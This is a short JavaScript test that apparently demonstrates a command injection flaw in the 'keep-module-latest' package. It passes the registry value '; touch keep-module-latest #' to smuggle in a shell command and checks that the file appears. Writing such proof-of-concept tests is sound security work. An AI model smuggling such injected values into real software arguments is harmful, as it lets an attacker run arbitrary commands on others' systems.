test("Remote code execution for keep-module-latest", (done) => {
  let fs = require('fs');
  let root = require('keep-module-latest');
  let path = "./keep-module-latest";
  if (fs.existsSync(path))
    fs.unlinkSync(path);

  var file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  root({ registry: "; touch keep-module-latest #", moduleName: "keep-module-latest" })
    .then(() => { })
    .catch(() => { })
    .finally(() => {
      var file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, (err) => { done(); });
    })
});
